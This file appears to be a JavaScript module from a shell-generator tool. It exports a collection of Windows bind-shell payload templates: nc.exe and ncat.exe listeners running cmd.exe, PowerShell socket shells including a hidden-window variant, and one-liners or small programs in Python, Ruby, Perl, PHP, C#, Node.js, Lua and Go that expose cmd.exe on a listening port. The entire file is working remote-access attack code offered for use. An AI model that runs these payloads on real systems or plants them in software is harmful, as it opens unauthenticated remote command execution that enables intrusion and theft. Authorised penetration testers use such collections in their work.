// Windows Bind Shell Payloads
// The target LISTENS on {port}, attacker CONNECTS to target
// All payloads use {ip} and {port} placeholders

const BIND_WINDOWS_PAYLOADS = {
  "nc.exe Bind": `nc.exe -lvnp {port} -e cmd.exe`,

  "ncat.exe Bind": `ncat.exe -lvnp {port} -e cmd.exe`,

  "ncat.exe Bind (allow)": `ncat.exe -lvnp {port} --allow {ip} -e cmd.exe`,

  "PowerShell Bind #1": `powershell -nop -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{port});$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();$listener.Stop()"`,

  "PowerShell Bind #2 (hidden)": `powershell -nop -W hidden -c "$l = New-Object System.Net.Sockets.TcpListener([IPAddress]::Any,{port});$l.Start();$c = $l.AcceptTcpClient();$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{$d = (New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r = (iex $d 2>&1 | Out-String);$e = ([text.encoding]::ASCII).GetBytes($r);$s.Write($e,0,$e.Length);$s.Flush()}};$c.Close();$l.Stop()"`,

  "Python Bind Windows": `python -c "import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(['cmd.exe'])"`,

  "Python3 Bind Windows": `python3 -c "import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(['cmd.exe'])"`,

  "Ruby Bind Windows": `ruby -rsocket -e "s=TCPServer.new('0.0.0.0',{port});c=s.accept;$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec 'cmd.exe'"`,

  "Perl Bind Windows": `perl -e "use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in($p,INADDR_ANY));listen(S,1);accept(C,S);open(STDIN,'>&C');open(STDOUT,'>&C');open(STDERR,'>&C');system('cmd.exe');"`,

  "PHP Bind Windows": `php -r "$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_set_option($s,SOL_SOCKET,SO_REUSEADDR,1);socket_bind($s,'0.0.0.0',{port});socket_listen($s,1);$c=socket_accept($s);while(1){{$cmd=socket_read($c,2048);$out=shell_exec($cmd);socket_write($c,$out,strlen($out));}}"`,

  "C# Bind Shell": `using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;

class BindShell {{
    static void Main() {{
        TcpListener listener = new TcpListener(IPAddress.Any, {port});
        listener.Start();
        TcpClient client = listener.AcceptTcpClient();
        Stream stream = client.GetStream();
        StreamReader rdr = new StreamReader(stream);
        StreamWriter wrt = new StreamWriter(stream);
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.CreateNoWindow = true;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardInput = true;
        p.StartInfo.RedirectStandardError = true;
        p.OutputDataReceived += (s, e) => {{ if (!String.IsNullOrEmpty(e.Data)) {{ wrt.WriteLine(e.Data); wrt.Flush(); }} }};
        p.Start();
        p.BeginOutputReadLine();
        while (true) {{ p.StandardInput.WriteLine(rdr.ReadLine()); }}
    }}
}}`,

  "Node.js Bind Windows": `(function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("cmd.exe", []);
    var server = net.createServer(function(client) {{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    server.listen({port});
}})();`,

  "Lua Bind Windows": `lua -e "local s=require('socket');local srv=s.bind('0.0.0.0',{port});local c=srv:accept();while true do local cmd=c:receive();local f=io.popen(cmd,'r');local out=f:read('*a');f:close();c:send(out) end;c:close()"`,

  "Golang Bind Windows": `echo package main;import("net";"os/exec");func main(){{l,_:=net.Listen("tcp","0.0.0.0:{port}");c,_:=l.Accept();for{{b:=make([]byte,1024);n,_:=c.Read(b);out,_:=exec.Command("cmd.exe","/c",string(b[:n])).CombinedOutput();c.Write(out)}}} > bind.go && go run bind.go`,
};

export default BIND_WINDOWS_PAYLOADS;
